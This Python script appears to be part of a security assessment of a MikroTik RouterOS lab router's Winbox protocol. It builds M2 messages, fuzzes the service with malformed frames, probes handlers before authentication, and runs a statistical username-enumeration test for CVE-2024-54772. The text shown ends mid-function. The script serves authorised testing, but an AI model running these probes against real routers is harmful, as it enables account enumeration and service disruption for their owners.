#!/usr/bin/env python3
"""
MikroTik RouterOS CHR 7.20.8 — Winbox Protocol Security Assessment
Phase 5, Script 1
Target: [REDACTED-INTERNAL-IP]:8291

Tests (~200):
  1. M2 Protocol Implementation           (~20 tests)
  2. Pre-Auth M2 Probing                  (~30 tests)
  3. Username Enumeration Regression       (~30 tests)
     (CVE-2024-54772)
  4. Post-Auth Handler Enumeration         (~40 tests)
  5. M2 Message Fuzzing                   (~40 tests)
  6. EC-SRP5 Key Exchange Manipulation     (~20 tests)
  7. Session Management                   (~20 tests)

Evidence: evidence/winbox_attacks.json
"""

import hashlib
import os
import socket
import struct
import sys
import time
import traceback

sys.path.insert(0, '/home/[REDACTED]/Desktop/[REDACTED-PATH]/MikroTik/scripts')
from mikrotik_common import (
    EvidenceCollector, check_router_alive, wait_for_router,
    pull_router_logs, log, TARGET, ADMIN_USER, ADMIN_PASS,
)

WINBOX_PORT = 8291
CONNECT_TIMEOUT = 5
READ_TIMEOUT = 3

ev = EvidenceCollector("attack_winbox.py", phase=5)
test_counter = 0  # for periodic health checks


# ═══════════════════════════════════════════════════════════════════════════════
# M2 Protocol Helpers
# ═══════════════════════════════════════════════════════════════════════════════

# -- Key type constants --
M2_BOOL_TRUE  = 0x00
M2_BOOL_FALSE = 0x01
M2_U32        = 0x08
M2_U64        = 0x09
M2_IPV6       = 0x0A
M2_STRING     = 0x10
M2_MSG        = 0x18
M2_RAW        = 0x20
M2_BOOL_ARRAY = 0x28
M2_U32_ARRAY  = 0x30
M2_STR_ARRAY  = 0x38
M2_MSG_ARRAY  = 0x48

# -- Key ID constants (3-byte big-endian) --
SYS_TO       = 0x000001
SYS_FROM     = 0x000002
REQUEST_ID   = 0x000003
COMMAND      = 0x000004
STATUS       = 0x000005
ERROR_MSG    = 0x000006
SESSION_ID   = 0x000008
USERNAME     = 0x00000A
PASSWORD     = 0x00000B

# -- Handler IDs --
HANDLER_LOGIN     = 2
HANDLER_SYSTEM    = 13
HANDLER_INTERFACE = 14
HANDLER_FILE      = 24


def m2_encode_frame(body: bytes) -> bytes:
    """Wrap an M2 message body into a framed packet (2-byte big-endian length prefix)."""
    return struct.pack('>H', len(body)) + body


def m2_encode_bool(key_id: int, value: bool = True) -> bytes:
    """Encode an M2 boolean key-value pair."""
    ktype = M2_BOOL_TRUE if value else M2_BOOL_FALSE
    return bytes([ktype]) + key_id.to_bytes(3, 'big')


def m2_encode_u32(key_id: int, value: int) -> bytes:
    """Encode an M2 u32 key-value pair."""
    return bytes([M2_U32]) + key_id.to_bytes(3, 'big') + struct.pack('<I', value & 0xFFFFFFFF)


def m2_encode_u64(key_id: int, value: int) -> bytes:
    """Encode an M2 u64 key-value pair."""
    return bytes([M2_U64]) + key_id.to_bytes(3, 'big') + struct.pack('<Q', value & 0xFFFFFFFFFFFFFFFF)


def m2_encode_string(key_id: int, value: str) -> bytes:
    """Encode an M2 string key-value pair (2-byte big-endian length prefix)."""
    data = value.encode('utf-8')
    return bytes([M2_STRING]) + key_id.to_bytes(3, 'big') + struct.pack('>H', len(data)) + data


def m2_encode_raw(key_id: int, value: bytes) -> bytes:
    """Encode an M2 raw-bytes key-value pair (2-byte big-endian length prefix)."""
    return bytes([M2_RAW]) + key_id.to_bytes(3, 'big') + struct.pack('>H', len(value)) + value


def m2_encode_nested(key_id: int, inner_body: bytes) -> bytes:
    """Encode a nested M2 message key-value pair."""
    return bytes([M2_MSG]) + key_id.to_bytes(3, 'big') + struct.pack('>H', len(inner_body)) + inner_body


def m2_build_login_msg(username: str, password: str = "") -> bytes:
    """Build an M2 login message targeting handler 2."""
    body = b""
    body += m2_encode_u32(SYS_TO, HANDLER_LOGIN)
    body += m2_encode_u32(REQUEST_ID, 1)
    body += m2_encode_u32(COMMAND, 1)  # login command
    body += m2_encode_string(USERNAME, username)
    if password:
        body += m2_encode_string(PASSWORD, password)
    return m2_encode_frame(body)


def m2_build_handler_msg(handler_id: int, command: int = 1,
                         request_id: int = 1, extras: bytes = b"") -> bytes:
    """Build an M2 message targeting an arbitrary handler."""
    body = b""
    body += m2_encode_u32(SYS_TO, handler_id)
    body += m2_encode_u32(REQUEST_ID, request_id)
    body += m2_encode_u32(COMMAND, command)
    body += extras
    return m2_encode_frame(body)


def m2_decode_frame(data: bytes):
    """Attempt to decode an M2 frame. Returns list of (key_type, key_id, value) tuples.
    Best-effort; silently skips malformed entries."""
    results = []
    if len(data) < 2:
        return results
    frame_len = struct.unpack('>H', data[:2])[0]
    body = data[2:2 + frame_len]
    pos = 0
    while pos < len(body):
        if pos + 4 > len(body):
            break
        ktype = body[pos]
        kid = int.from_bytes(body[pos+1:pos+4], 'big')
        pos += 4

        if ktype in (M2_BOOL_TRUE, M2_BOOL_FALSE):
            results.append((ktype, kid, ktype == M2_BOOL_TRUE))
        elif ktype == M2_U32:
            if pos + 4 > len(body):
                break
            val = struct.unpack('<I', body[pos:pos+4])[0]
            results.append((ktype, kid, val))
            pos += 4
        elif ktype == M2_U64:
            if pos + 8 > len(body):
                break
            val = struct.unpack('<Q', body[pos:pos+8])[0]
            results.append((ktype, kid, val))
            pos += 8
        elif ktype == M2_IPV6:
            if pos + 16 > len(body):
                break
            val = body[pos:pos+16]
            results.append((ktype, kid, val.hex()))
            pos += 16
        elif ktype in (M2_STRING, M2_MSG, M2_RAW,
                       M2_STR_ARRAY, M2_MSG_ARRAY):
            if pos + 2 > len(body):
                break
            vlen = struct.unpack('>H', body[pos:pos+2])[0]
            pos += 2
            if pos + vlen > len(body):
                val = body[pos:]
                results.append((ktype, kid, val))
                break
            val = body[pos:pos+vlen]
            results.append((ktype, kid, val))
            pos += vlen
        elif ktype in (M2_U32_ARRAY,):
            if pos + 2 > len(body):
                break
            vlen = struct.unpack('>H', body[pos:pos+2])[0]
            pos += 2
            val = body[pos:pos+vlen]
            results.append((ktype, kid, val))
            pos += vlen
        else:
            # Unknown type -- record and stop (can't determine length)
            results.append((ktype, kid, f"UNKNOWN_TYPE_0x{ktype:02x}"))
            break
    return results


def winbox_connect(timeout=CONNECT_TIMEOUT):
    """Open a TCP socket to the Winbox port. Returns socket or None."""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    try:
        s.connect((TARGET, WINBOX_PORT))
        return s
    except Exception:
        s.close()
        return None


def winbox_send_recv(payload: bytes, timeout=READ_TIMEOUT, recv_size=8192):
    """Connect, send payload, receive response, close. Returns (response_bytes, elapsed)."""
    s = winbox_connect()
    if not s:
        return None, 0.0
    try:
        start = time.time()
        s.send(payload)
        s.settimeout(timeout)
        try:
            resp = s.recv(recv_size)
        except socket.timeout:
            resp = b""
        elapsed = time.time() - start
        return resp, elapsed
    except Exception:
        return None, 0.0
    finally:
        try:
            s.close()
        except Exception:
            pass


def winbox_send_recv_multi(payload: bytes, timeout=READ_TIMEOUT,
                           recv_size=8192, read_count=3, read_delay=0.3):
    """Connect, send, do multiple reads with delays. Returns (all_data, elapsed)."""
    s = winbox_connect()
    if not s:
        return None, 0.0
    try:
        start = time.time()
        s.send(payload)
        s.settimeout(timeout)
        all_data = b""
        for _ in range(read_count):
            try:
                chunk = s.recv(recv_size)
                if chunk:
                    all_data += chunk
                else:
                    break
            except socket.timeout:
                break
            time.sleep(read_delay)
        elapsed = time.time() - start
        return all_data, elapsed
    except Exception:
        return None, 0.0
    finally:
        try:
            s.close()
        except Exception:
            pass


def periodic_health_check():
    """Call after every ~10 tests. If router is down, wait for it."""
    global test_counter
    test_counter += 1
    if test_counter % 10 == 0:
        status = check_router_alive()
        if not status.get("alive"):
            ev.add_finding(
                "HIGH", "Router unresponsive during Winbox testing",
                f"Router stopped responding after test #{test_counter}. "
                "Possible crash triggered by Winbox protocol testing.",
                evidence_refs=[f"test #{test_counter}"],
                cwe="CWE-400",
            )
            wait_for_router(max_wait=90)


def safe_hex(data, max_len=200):
    """Safely hex-encode data, truncating if needed."""
    if data is None:
        return "None"
    h = data.hex()
    if len(h) > max_len:
        return h[:max_len] + f"...(total {len(data)} bytes)"
    return h


# ═══════════════════════════════════════════════════════════════════════════════
# Category 1: M2 Protocol Implementation (~20 tests)
# ═══════════════════════════════════════════════════════════════════════════════

def test_m2_protocol_implementation():
    """Verify M2 encoder/decoder and basic protocol behavior."""
    log("=" * 60)
    log("Category 1: M2 Protocol Implementation")
    log("=" * 60)

    # -- Test 1: TCP connectivity --
    s = winbox_connect()
    if s:
        ev.add_test("m2_protocol", "TCP connect to Winbox",
                     "Verify port 8291 accepts TCP connections",
                     "Connected successfully")
        s.close()
    else:
        ev.add_test("m2_protocol", "TCP connect to Winbox",
                     "Verify port 8291 accepts TCP connections",
                     "FAILED - cannot connect", anomaly=True)
        return  # No point continuing if we can't connect
    periodic_health_check()

    # -- Test 2: Server-speaks-first check --
    s = winbox_connect()
    if s:
        s.settimeout(3)
        try:
            initial = s.recv(4096)
            ev.add_test("m2_protocol", "Server-speaks-first check",
                         "Check if Winbox sends data before client",
                         f"Server sent {len(initial)} bytes unprompted",
                         {"hex": safe_hex(initial)})
        except socket.timeout:
            ev.add_test("m2_protocol", "Server-speaks-first check",
                         "Check if Winbox sends data before client",
                         "No data from server (client-speaks-first protocol)")
        s.close()
    periodic_health_check()

    # -- Test 3: Minimal M2 frame (empty body) --
    frame = m2_encode_frame(b"")
    resp, elapsed = winbox_send_recv(frame)
    ev.add_test("m2_protocol", "Send empty M2 frame",
                 "Send frame with size=0 body",
                 f"Response: {len(resp) if resp else 0} bytes in {elapsed:.3f}s",
                 {"sent_hex": safe_hex(frame), "resp_hex": safe_hex(resp),
                  "elapsed": elapsed})
    periodic_health_check()

    # -- Test 4: Minimal valid M2 message to login handler --
    body = m2_encode_u32(SYS_TO, HANDLER_LOGIN)
    frame = m2_encode_frame(body)
    resp, elapsed = winbox_send_recv(frame)
    ev.add_test("m2_protocol", "Minimal M2 to login handler",
                 "Send SYS_TO=2 with no other fields",
                 f"Response: {len(resp) if resp else 0} bytes in {elapsed:.3f}s",
                 {"sent_hex": safe_hex(frame), "resp_hex": safe_hex(resp),
                  "decoded": str(m2_decode_frame(resp)) if resp else "None"})
    periodic_health_check()

    # -- Test 5: M2 with SYS_TO + COMMAND --
    body = m2_encode_u32(SYS_TO, HANDLER_LOGIN) + m2_encode_u32(COMMAND, 1)
    frame = m2_encode_frame(body)
    resp, elapsed = winbox_send_recv(frame)
    ev.add_test("m2_protocol", "M2 SYS_TO + COMMAND to login",
                 "Send login handler with command=1",
                 f"Response: {len(resp) if resp else 0} bytes in {elapsed:.3f}s",
                 {"sent_hex": safe_hex(frame), "resp_hex": safe_hex(resp),
                  "decoded": str(m2_decode_frame(resp)) if resp else "None"})
    periodic_health_check()

    # -- Test 6: M2 with SYS_TO + SYS_FROM + REQUEST_ID --
    body = (m2_encode_u32(SYS_TO, HANDLER_LOGIN)
            + m2_encode_u32(SYS_FROM, 0)
            + m2_encode_u32(REQUEST_ID, 1))
    frame = m2_encode_frame(body)
    resp, elapsed = winbox_send_recv(frame)
    ev.add_test("m2_protocol", "M2 full header fields",
                 "SYS_TO=2, SYS_FROM=0, REQUEST_ID=1",
                 f"Response: {len(resp) if resp else 0} bytes in {elapsed:.3f}s",
                 {"sent_hex": safe_hex(frame), "resp_hex": safe_hex(resp)})
    periodic_health_check()

    # -- Test 7: M2 login message with username only --
    frame = m2_build_login_msg("admin")
    resp, elapsed = winbox_send_recv(frame)
    decoded = m2_decode_frame(resp) if resp else []
    ev.add_test("m2_protocol", "Login msg username-only (admin)",
                 "M2 login message with username=admin, no password",
                 f"Response: {len(resp) if resp else 0} bytes in {elapsed:.3f}s",
                 {"sent_hex": safe_hex(frame), "resp_hex": safe_hex(resp),
                  "decoded": str(decoded)})
    periodic_health_check()

    # -- Test 8: M2 login message with username + password --
    frame = m2_build_login_msg(ADMIN_USER, ADMIN_PASS)
    resp, elapsed = winbox_send_recv(frame)
    decoded = m2_decode_frame(resp) if resp else []
    ev.add_test("m2_protocol", "Login msg with credentials",
                 "M2 login message with admin/TestPass123",
                 f"Response: {len(resp) if resp else 0} bytes in {elapsed:.3f}s",
                 {"sent_hex": safe_hex(frame), "resp_hex": safe_hex(resp),
                  "decoded": str(decoded)},
                 anomaly=resp is not None and len(resp) == 0)
    periodic_health_check()

    # -- Test 9: M2 decoder validation on known structure --
    body = (m2_encode_u32(SYS_TO, 2) + m2_encode_string(USERNAME, "test")
            + m2_encode_bool(0x0C, True) + m2_encode_raw(0x0D, b"\xde\xad"))
    frame = m2_encode_frame(body)
    decoded = m2_decode_frame(frame)
    ev.add_test("m2_protocol", "M2 encoder/decoder round-trip",
                 "Encode known KV pairs and decode; verify consistency",
                 f"Decoded {len(decoded)} KV pairs",
                 {"original_hex": safe_hex(frame), "decoded": str(decoded)})

    # -- Test 10: Multiple frames in one send --
    frame1 = m2_encode_frame(m2_encode_u32(SYS_TO, HANDLER_LOGIN))
    frame2 = m2_encode_frame(m2_encode_u32(SYS_TO, HANDLER_SYSTEM))
    combined = frame1 + frame2
    resp, elapsed = winbox_send_recv(combined, timeout=4)
    ev.add_test("m2_protocol", "Multiple M2 frames in one TCP send",
                 "Send two M2 frames concatenated in single TCP write",
                 f"Response: {len(resp) if resp else 0} bytes in {elapsed:.3f}s",
                 {"sent_hex": safe_hex(combined), "resp_hex": safe_hex(resp)})
    periodic_health_check()

    # -- Test 11: Large request ID values --
    body = m2_encode_u32(SYS_TO, HANDLER_LOGIN) + m2_encode_u32(REQUEST_ID, 0xFFFFFFFF)
    frame = m2_encode_frame(body)
    resp, elapsed = winbox_send_recv(frame)
    ev.add_test("m2_protocol", "Max request ID (0xFFFFFFFF)",
                 "Send M2 with REQUEST_ID=4294967295",
                 f"Response: {len(resp) if resp else 0} bytes",
                 {"resp_hex": safe_hex(resp)})

    # -- Test 12: Negative-like u32 (0x80000000) --
    body = m2_encode_u32(SYS_TO, HANDLER_LOGIN) + m2_encode_u32(REQUEST_ID, 0x80000000)
    frame = m2_encode_frame(body)
    resp, elapsed = winbox_send_recv(frame)
    ev.add_test("m2_protocol", "Signed-boundary request ID (0x80000000)",
                 "Send REQUEST_ID at signed int32 boundary",
                 f"Response: {len(resp) if resp else 0} bytes",
                 {"resp_hex": safe_hex(resp)})
    periodic_health_check()

    # -- Test 13: SYS_TO=0 (null handler) --
    body = m2_encode_u32(SYS_TO, 0)
    frame = m2_encode_frame(body)
    resp, elapsed = winbox_send_recv(frame)
    ev.add_test("m2_protocol", "SYS_TO=0 (null handler)",
                 "Target handler ID 0",
                 f"Response: {len(resp) if resp else 0} bytes",
                 {"resp_hex": safe_hex(resp)})

    # -- Test 14: SYS_TO=0xFFFFFFFF (max handler) --
    body = m2_encode_u32(SYS_TO, 0xFFFFFFFF)
    frame = m2_encode_frame(body)
    resp, elapsed = winbox_send_recv(frame)
    ev.add_test("m2_protocol", "SYS_TO=0xFFFFFFFF (max handler)",
                 "Target handler ID at u32 max",
                 f"Response: {len(resp) if resp else 0} bytes",
                 {"resp_hex": safe_hex(resp)})
    periodic_health_check()

    # -- Test 15: Only SYS_FROM, no SYS_TO --
    body = m2_encode_u32(SYS_FROM, 1) + m2_encode_u32(REQUEST_ID, 1)
    frame = m2_encode_frame(body)
    resp, elapsed = winbox_send_recv(frame)
    ev.add_test("m2_protocol", "M2 without SYS_TO (SYS_FROM only)",
                 "Send message with SYS_FROM but missing SYS_TO",
                 f"Response: {len(resp) if resp else 0} bytes",
                 {"resp_hex": safe_hex(resp)})

    # -- Test 16: u64 in SYS_TO field --
    body = m2_encode_u64(SYS_TO, HANDLER_LOGIN)
    frame = m2_encode_frame(body)
    resp, elapsed = winbox_send_recv(frame)
    ev.add_test("m2_protocol", "u64 type for SYS_TO",
                 "Send SYS_TO as u64 instead of u32 (type confusion)",
                 f"Response: {len(resp) if resp else 0} bytes",
                 {"resp_hex": safe_hex(resp)})
    periodic_health_check()

    # -- Test 17: String type for SYS_TO --
    body = m2_encode_string(SYS_TO, "2")
    frame = m2_encode_frame(body)
    resp, elapsed = winbox_send_recv(frame)
    ev.add_test("m2_protocol", "String type for SYS_TO",
                 "Send SYS_TO as string '2' instead of u32 (type confusion)",
                 f"Response: {len(resp) if resp else 0} bytes",
                 {"resp_hex": safe_hex(resp)})

    # -- Test 18: Fragmented frame send --
    body = m2_encode_u32(SYS_TO, HANDLER_LOGIN) + m2_encode_u32(COMMAND, 1)
    frame = m2_encode_frame(body)
    s = winbox_connect()
    frag_result = "N/A"
    if s:
        try:
            # Send header (2 bytes) then body separately
            s.send(frame[:2])
            time.sleep(0.3)
            s.send(frame[2:])
            s.settimeout(READ_TIMEOUT)
            try:
                resp = s.recv(8192)
                frag_result = f"Response: {len(resp)} bytes"
            except socket.timeout:
                frag_result = "No response (timeout)"
                resp = b""
        except Exception as e:
            frag_result = f"Error: {e}"
            resp = b""
        s.close()
    ev.add_test("m2_protocol", "Fragmented M2 frame (split header/body)",
                 "Send 2-byte frame header then body with 300ms gap",
                 frag_result,
                 {"resp_hex": safe_hex(resp) if resp else "None"})
    periodic_health_check()

    # -- Test 19: Rapid reconnect --
    success_count = 0
    for i in range(5):
        s = winbox_connect(timeout=2)
        if s:
            success_count += 1
            s.close()
    ev.add_test("m2_protocol", "Rapid reconnect (5x)",
                 "Open and close TCP connections in quick succession",
                 f"{success_count}/5 connections succeeded")

    # -- Test 20: Connection with immediate close --
    s = winbox_connect()
    if s:
        s.close()
        ev.add_test("m2_protocol", "Connect and immediate close",
                     "Open TCP, close immediately without sending data",
                     "Connection opened and closed cleanly")
    else:
        ev.add_test("m2_protocol", "Connect and immediate close",
                     "Open TCP, close immediately",
                     "Failed to connect", anomaly=True)
    periodic_health_check()


# ═══════════════════════════════════════════════════════════════════════════════
# Category 2: Pre-Auth M2 Probing (~30 tests)
# ═══════════════════════════════════════════════════════════════════════════════

def test_preauth_probing():
    """Pre-authentication protocol probing and boundary testing."""
    log("=" * 60)
    log("Category 2: Pre-Auth M2 Probing")
    log("=" * 60)

    # -- Test 1: Empty frame (size=0) --
    frame = struct.pack('>H', 0)
    resp, elapsed = winbox_send_recv(frame)
    ev.add_test("preauth_probe", "Empty frame (size=0)",
                 "Send 2-byte header with length=0",
                 f"Response: {len(resp) if resp else 0} bytes in {elapsed:.3f}s",
                 {"sent_hex": safe_hex(frame), "resp_hex": safe_hex(resp)})
    periodic_health_check()

    # -- Test 2: Frame size=1, minimal body --
    frame = struct.pack('>H', 1) + b"\x00"
    resp, elapsed = winbox_send_recv(frame)
    ev.add_test("preauth_probe", "Frame size=1 (single null byte)",
                 "Send frame header claiming 1 byte + 1 null byte body",
                 f"Response: {len(resp) if resp else 0} bytes",
                 {"resp_hex": safe_hex(resp)})

    # -- Test 3: Frame size=65535, small body --
    frame = struct.pack('>H', 65535) + b"\x41" * 10
    resp, elapsed = winbox_send_recv(frame, timeout=3)
    ev.add_test("preauth_probe", "Frame size=65535 with 10-byte body",
                 "Size header claims 65535 but only send 10 bytes (length mismatch)",
                 f"Response: {len(resp) if resp else 0} bytes in {elapsed:.3f}s",
                 {"resp_hex": safe_hex(resp)},
                 anomaly=(resp is not None and len(resp) > 0))
    periodic_health_check()

    # -- Test 4: Frame size=65535, full body --
    large_body = b"\x00" * 65535
    frame = struct.pack('>H', 65535) + large_body
    resp, elapsed = winbox_send_recv(frame, timeout=5)
    ev.add_test("preauth_probe", "Frame size=65535 full body (64KB)",
                 "Send maximum-size M2 frame with null body",
                 f"Response: {len(resp) if resp else 0} bytes in {elapsed:.3f}s",
                 {"resp_size": len(resp) if resp else 0})
    periodic_health_check()

    # -- Test 5: Non-M2 data: HTTP request --
    http_req = b"GET / HTTP/1.1\r\nHost: " + TARGET.encode() + b"\r\n\r\n"
    resp, elapsed = winbox_send_recv(http_req)
    ev.add_test("preauth_probe", "Send HTTP GET to Winbox port",
                 "Send HTTP/1.1 request to binary protocol port",
                 f"Response: {len(resp) if resp else 0} bytes",
                 {"resp_hex": safe_hex(resp),
                  "resp_ascii": resp.decode('utf-8', errors='replace')[:200] if resp else "None"})

    # -- Test 6: Non-M2 data: SSH banner --
    ssh_banner = b"SSH-2.0-OpenSSH_9.2\r\n"
    resp, elapsed = winbox_send_recv(ssh_banner)
    ev.add_test("preauth_probe", "Send SSH banner to Winbox port",
                 "Send SSH protocol string to binary protocol port",
                 f"Response: {len(resp) if resp else 0} bytes",
                 {"resp_hex": safe_hex(resp)})
    periodic_health_check()

    # -- Test 7: Non-M2 data: random bytes --
    random_data = os.urandom(64)
    resp, elapsed = winbox_send_recv(random_data)
    ev.add_test("preauth_probe", "Send 64 random bytes",
                 "Send random binary data to Winbox",
                 f"Response: {len(resp) if resp else 0} bytes",
                 {"resp_hex": safe_hex(resp)})

    # -- Test 8: Non-M2 data: TLS ClientHello --
    # Minimal TLS 1.0 ClientHello
    tls_hello = bytes([
        0x16, 0x03, 0x01, 0x00, 0x05,  # TLS record header
        0x01, 0x00, 0x00, 0x01, 0x00,   # ClientHello stub
    ])
    resp, elapsed = winbox_send_recv(tls_hello)
    ev.add_test("preauth_probe", "Send TLS ClientHello to Winbox",
                 "Send TLS record to binary protocol port",
                 f"Response: {len(resp) if resp else 0} bytes",
                 {"resp_hex": safe_hex(resp)})
    periodic_health_check()

    # -- Test 9: Single byte sends (0x00 through 0x05) --
    for byte_val in range(6):
        resp, elapsed = winbox_send_recv(bytes([byte_val]), timeout=2)
        ev.add_test("preauth_probe", f"Single byte 0x{byte_val:02x}",
                     f"Send single byte 0x{byte_val:02x} to Winbox",
                     f"Response: {len(resp) if resp else 0} bytes",
                     {"resp_hex": safe_hex(resp)})
    periodic_health_check()

    # -- Test 15: M2 to login handler with no credentials --
    body = m2_encode_u32(SYS_TO, HANDLER_LOGIN) + m2_encode_u32(COMMAND, 1)
    frame = m2_encode_frame(body)
    resp, elapsed = winbox_send_recv(frame)
    ev.add_test("preauth_probe", "Login handler no credentials",
                 "SYS_TO=2 CMD=1 with no username/password",
                 f"Response: {len(resp) if resp else 0} bytes",
                 {"resp_hex": safe_hex(resp),
                  "decoded": str(m2_decode_frame(resp)) if resp else "None"})

    # -- Tests 16-25: Handler probing pre-auth (handlers 1-10) --
    for hid in range(1, 11):
        body = m2_encode_u32(SYS_TO, hid) + m2_encode_u32(COMMAND, 1)
        frame = m2_encode_frame(body)
        resp, elapsed = winbox_send_recv(frame, timeout=2)
        anomaly = resp is not None and len(resp) > 0
        ev.add_test("preauth_probe", f"Pre-auth handler probe ID={hid}",
                     f"Send CMD=1 to handler {hid} without authentication",
                     f"Response: {len(resp) if resp else 0} bytes",
                     {"handler_id": hid, "resp_hex": safe_hex(resp),
                      "decoded": str(m2_decode_frame(resp)) if resp and len(resp) > 2 else "None"},
                     anomaly=anomaly)
    periodic_health_check()

    # -- Tests 26-28: Probe known handlers pre-auth --
    for hname, hid in [("system", HANDLER_SYSTEM),
                       ("interface", HANDLER_INTERFACE),
                       ("file", HANDLER_FILE)]:
        body = m2_encode_u32(SYS_TO, hid) + m2_encode_u32(COMMAND, 7)  # 7=print/list
        frame = m2_encode_frame(body)
        resp, elapsed = winbox_send_recv(frame, timeout=2)
        ev.add_test("preauth_probe", f"Pre-auth {hname} handler (ID={hid})",
                     f"Send CMD=7 (print) to {hname} handler without auth",
                     f"Response: {len(resp) if resp else 0} bytes",
                     {"resp_hex": safe_hex(resp),
                      "decoded": str(m2_decode_frame(resp)) if resp and len(resp) > 2 else "None"})

    # -- Test 29: All-zeros payload (256 bytes) --
    resp, elapsed = winbox_send_recv(b"\x00" * 256, timeout=2)
    ev.add_test("preauth_probe", "256 null bytes",
                 "Send 256 null bytes to Winbox",
                 f"Response: {len(resp) if resp else 0} bytes",
                 {"resp_hex": safe_hex(resp)})
    periodic_health_check()

    # -- Test 30: All 0xFF payload (256 bytes) --
    resp, elapsed = winbox_send_recv(b"\xff" * 256, timeout=2)
    ev.add_test("preauth_probe", "256 x 0xFF bytes",
                 "Send 256 bytes of 0xFF to Winbox",
                 f"Response: {len(resp) if resp else 0} bytes",
                 {"resp_hex": safe_hex(resp)})
    periodic_health_check()


# ═══════════════════════════════════════════════════════════════════════════════
# Category 3: Username Enumeration Regression (CVE-2024-54772) (~30 tests)
# ═══════════════════════════════════════════════════════════════════════════════

def test_username_enumeration():
    """Test for CVE-2024-54772 username enumeration via response size/timing."""
    log("=" * 60)
    log("Category 3: Username Enumeration (CVE-2024-54772)")
    log("=" * 60)

    valid_user = "admin"
    invalid_users = ["nonexistent_user_xyz", "fakeuser99", "nobody"]
    iterations = 25

    # Collect valid-user response metrics
    valid_sizes = []
    valid_times = []
    valid_responses = []

    log(f"  Sending {iterations} login attempts for valid user '{valid_user}'...")
    for i in range(iterations):
        frame = m2_build_login_msg(valid_user)
        resp, elapsed = winbox_send_recv(frame, timeout=5)
        rlen = len(resp) if resp else 0
        valid_sizes.append(rlen)
        valid_times.append(elapsed)
        if i == 0 and resp:
            valid_responses.append(safe_hex(resp))
        time.sleep(0.05)  # small delay to avoid flood protection

    ev.add_test("user_enum", f"Valid user '{valid_user}' response collection",
                 f"Collect {iterations} login responses for valid username",
                 f"Avg size={sum(valid_sizes)/len(valid_sizes):.1f}, "
                 f"Avg time={sum(valid_times)/len(valid_times)*1000:.1f}ms",
                 {"sizes": valid_sizes, "times_ms": [round(t*1000, 2) for t in valid_times],
                  "sample_response": valid_responses[0] if valid_responses else "None"})
    periodic_health_check()

    # Collect invalid-user response metrics for each invalid user
    all_invalid_sizes = []
    all_invalid_times = []

    for inv_user in invalid_users:
        inv_sizes = []
        inv_times = []
        inv_responses = []

        log(f"  Sending {iterations} login attempts for invalid user '{inv_user}'...")
        for i in range(iterations):
            frame = m2_build_login_msg(inv_user)
            resp, elapsed = winbox_send_recv(frame, timeout=5)
            rlen = len(resp) if resp else 0
            inv_sizes.append(rlen)
            inv_times.append(elapsed)
            if i == 0 and resp:
                inv_responses.append(safe_hex(resp))
            time.sleep(0.05)

        all_invalid_sizes.extend(inv_sizes)
        all_invalid_times.extend(inv_times)

        ev.add_test("user_enum", f"Invalid user '{inv_user}' response collection",
                     f"Collect {iterations} login responses for invalid username",
                     f"Avg size={sum(inv_sizes)/len(inv_sizes):.1f}, "
                     f"Avg time={sum(inv_times)/len(inv_times)*1000:.1f}ms",
                     {"sizes": inv_sizes,
                      "times_ms": [round(t*1000, 2) for t in inv_times],
                      "sample_response": inv_responses[0] if inv_responses else "None"})
        periodic_health_check()

    # -- Statistical comparison --
    def mean(lst):
        return sum(lst) / len(lst) if lst else 0

    def stddev(lst):
        if len(lst) < 2:
            return 0
        m = mean(lst)
        return (sum((x - m) ** 2 for x in lst) / (len(lst) - 1)) ** 0.5

    valid_size_mean = mean(valid_sizes)
    valid_size_std = stddev(valid_sizes)
    invalid_size_mean = mean(all_invalid_sizes)
    invalid_size_std = stddev(all_invalid_sizes)

    valid_time_mean = mean(valid_times)
    valid_time_std = stddev(valid_times)
    invalid_time_mean = mean(all_invalid_times)
    invalid_time_std = stddev(all_invalid_times)

    size_diff = abs(valid_size_mean - invalid_size_mean)
    time_diff_ms = abs(valid_time_mean - invalid_time_mean) * 1000

    # Simple t-test approximation for size difference
    size_t_stat = 0
    if valid_size_std + invalid_size_std > 0:
        pooled_se = ((valid_size_std**2 / max(len(valid_sizes), 1))
                     + (invalid_size_std**2 / max(len(all_invalid_sizes), 1))) ** 0.5
        if pooled_se > 0:
            size_t_stat = (valid_size_mean - invalid_size_mean) / pooled_se

    # Same for timing
    time_t_stat = 0
    if valid_time_std + invalid_time_std > 0:
        pooled_se = ((valid_time_std**2 / max(len(valid_times), 1))
                     + (invalid_time_std**2 / max(len(all_invalid_times), 1))) ** 0.5
        if pooled_se > 0:
            time_t_stat = (valid_time_mean - invalid_time_mean) / pooled_se

    stats = {
        "valid_size_mean": round(valid_size_mean, 2),
        "valid_size_stddev": round(valid_size_std, 2),
        "invalid_size_mean": round(invalid_size_mean, 2),
        "invalid_size_stddev": round(invalid_size_std, 2),
        "size_difference": round(size_diff, 2),
        "size_t_statistic": round(size_t_stat, 3),
        "valid_time_mean_ms": round(valid_time_mean * 1000, 2),
        "valid_time_stddev_ms": round(valid_time_std * 1000, 2),
        "invalid_time_mean_ms": round(invalid_time_mean * 1000, 2),
        "invalid_time_stddev_ms": round(invalid_time_std * 1000, 2),
        "time_difference_ms": round(time_diff_ms, 2),
        "time_t_statistic": round(time_t_stat, 3),
        "total_valid_samples": len(valid_sizes),
        "total_invalid_samples": len(all_invalid_sizes),
    }

    # Determine if enumeration is possible
    size_enum = size_diff > 0 and abs(size_t_stat) > 2.0
    time_enum = time_diff_ms > 5.0 and abs(time_t_stat) > 2.0

    enum_result = "NOT VULNERABLE"
    if size_enum:
        enum_result = f"VULNERABLE (response size: {size_diff:.0f} byte difference, t={size_t_stat:.2f})"
    elif time_enum:
        enum_result = f"VULNERABLE (timing: {time_diff_ms:.1f}ms difference, t={time_t_stat:.2f})"

    ev.add_test("user_enum", "CVE-2024-54772 response size analysis",
                 "Compare response sizes for valid vs invalid usernames",
                 enum_result, stats,
                 anomaly=size_enum or time_enum)

    if size_enum:
        ev.add_finding(
            "MEDIUM",
            "Username enumeration via Winbox response size (CVE-2024-54772 regression)",
            f"Valid user responses average {valid_size_mean:.0f} bytes vs "
            f"invalid user responses {invalid_size_mean:.0f} bytes "
            f"(diff={size_diff:.0f}, t={size_t_stat:.2f}). "
            "An attacker can enumerate valid usernames without credentials.",
            evidence_refs=["user_enum tests"],
            cwe="CWE-204",
            cvss="5.3",
            reproduction_steps=[
                "1. Connect to TCP port 8291",
                "2. Send M2 login message with target username (no password)",
                "3. Measure response size",
                "4. Valid usernames produce different-sized responses than invalid ones",
            ],
        )

    if time_enum:
        ev.add_finding(
            "LOW",
